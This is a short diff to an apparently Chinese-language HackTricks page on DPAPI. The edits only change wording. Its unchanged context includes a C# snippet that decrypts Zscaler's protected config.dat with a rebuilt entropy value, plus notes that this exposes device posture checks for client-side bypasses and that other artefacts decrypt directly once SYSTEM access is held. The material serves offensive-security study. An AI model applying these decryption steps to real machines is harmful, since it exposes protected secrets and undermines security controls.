-1. 嵌入在 `ZSACredentialProvider.dll` 中的 hard-coded secret。
+1. 嵌入 `ZSACredentialProvider.dll` 内的 hard-coded secret。
 2. configuration 所属 Windows account 的 **SID**。
 
 该 DLL 实现的 algorithm 等价于：
@@ -413,9 +413,9 @@ byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
 byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
 Console.WriteLine(Encoding.UTF8.GetString(clear));
 ```
-解密后会得到完整的 JSON 配置，其中包括每个 **device posture check** 及其预期值——这些信息对于尝试 client-side bypasses 非常有价值。
+解密后会得到完整的 JSON 配置，其中包括每一项 **device posture check** 及其预期值——这些信息对于尝试进行客户端绕过非常有价值。
 
-> 提示：其他加密 artefacts（`*.mtt`、`*.mtp`、`*.mtc`、`*.ztc`）使用不带 entropy 的 DPAPI（`16` 个零字节）保护。因此，在获得 SYSTEM 权限后，可以直接使用 `ProtectedData.Unprotect` 对其进行解密。
+> 提示：其他加密 artefacts（`*.mtt`、`*.mtp`、`*.mtc`、`*.ztc`）使用 DPAPI 保护，且**不包含** entropy（`16` 个零字节）。因此，在获得 SYSTEM 权限后，可以直接使用 `ProtectedData.Unprotect` 对其进行解密。
 
 ## References
 
@@ -431,5 +431,4 @@ Console.WriteLine(Encoding.UTF8.GetString(clear));
 - [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
 - [11] [HTB Puppy：AD ACL abuse、KeePassXC Argon2 cracking，以及通过 DPAPI decryption 获取 DC admin 权限](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
 - [12] [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)
-
 {{#include ../../banners/hacktricks-training.md}}
